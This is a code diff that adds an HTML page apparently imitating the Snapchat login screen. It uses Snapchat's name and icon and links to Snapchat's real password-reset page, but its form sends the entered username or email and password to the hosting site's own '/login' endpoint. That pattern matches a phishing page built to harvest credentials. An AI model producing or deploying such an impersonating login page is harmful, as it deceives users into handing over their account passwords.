@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/Style/style.css">
+    <script src="/Script/script.js" defer></script>
+    <title>Log In | Snapchat</title>
+</head>
+
+<body>
+    <img src="/Style/assets/Snapchat Icon.png" alt="">
+    <h3>Log In To Snapchat</h3>
+    <form action="/login" method="post" enctype="application/x-www-form-urlencoded">
+        <div>
+            <section class="Username-Container">
+                <label for="userName">USERNAME OR EMAIL</label>
+                <input type="text" id="userName" name="username" required>
+            </section>
+            <section class="Password-Container" id="passwordContainer">
+                <label for="password">PASSWORD</label>
+                <section>
+                    <input type="password" id="password" name="password" required>
+                    <section id="passwordVisibility">
+                        <img class="image visible" src="/Style/assets/visibility_off_FILL0_wght400_GRAD0_opsz48.png"
+                            alt="Password Visible" id="visibilityOff">
+                        <img class="image" src="/Style/assets/visibility_FILL0_wght400_GRAD0_opsz48.png"
+                            alt="Password Invisible" id="visibilityOn">
+                    </section>
+                </section>
+            </section>
+            <section>
+                <input type="checkbox" name="" id="loginInfo">
+                <span>Save Login Info on your device</span>
+            </section>
+            <a href="https://accounts.snapchat.com/accounts/password_reset_options">Forget your password?</a>
+        </div>
+        <input type="submit" value="Log In">
+    </form>
+</body>
+
+</html>
